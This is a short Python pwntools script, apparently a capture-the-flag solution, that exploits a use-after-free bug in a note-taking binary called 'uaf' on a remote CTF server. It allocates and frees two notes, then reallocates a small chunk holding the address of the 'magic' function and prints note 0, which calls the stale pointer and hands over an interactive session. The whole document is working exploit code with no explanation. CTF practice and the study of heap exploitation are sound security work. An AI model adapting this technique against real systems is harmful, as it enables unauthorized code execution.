#!/usr/bin/python 
from pwn import * 

#context.log_level = 'debug'
#p = process("./uaf") 
p = remote("ctf.j0n9hyun.xyz", 3020) 
#gdb.attach(p) 
elf = ELF("./uaf") 
magic = elf.symbols['magic'] 

def add_note(size, content): 
    p.recvuntil(" :") 
    p.sendline("1") 
    p.recv() 
    p.sendline(str(size)) 
    p.recv() 
    p.sendline(content) 
    p.recv() 

def del_note(index): 
    p.recvuntil(" :") 
    p.sendline("2") 
    p.recv() 
    p.sendline(str(index)) 
    p.recv() 

def print_note(index): 
    p.recvuntil(" :") 
    p.sendline("3") 
    p.recv() 
    p.sendline(str(index)) 
    
add_note(0x90, "AAA") 
add_note(0x100, "BBB") 
#add_note(0x30, '') 
#add_note(0x30, '') 

del_note(0) 
del_note(1) 

add_note(0x20, p32(magic)) 

print_note(0) 

p.interactive()

